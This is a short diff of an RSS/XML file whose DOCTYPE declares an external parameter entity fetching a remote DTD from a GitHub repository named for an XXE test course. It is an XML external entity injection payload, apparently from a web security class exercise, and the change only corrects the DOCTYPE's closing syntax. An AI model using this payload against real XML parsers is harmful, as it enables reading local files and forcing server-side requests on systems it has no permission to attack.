@@ -2,7 +2,7 @@
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
 <!ENTITY % xxe SYSTEM 'https://raw.githubusercontent.com/dsvid/COMP6843_xxe_tests/master/v2_external.txt'>
 %xxe;
- >]>
+ ]>
  <rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
 	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
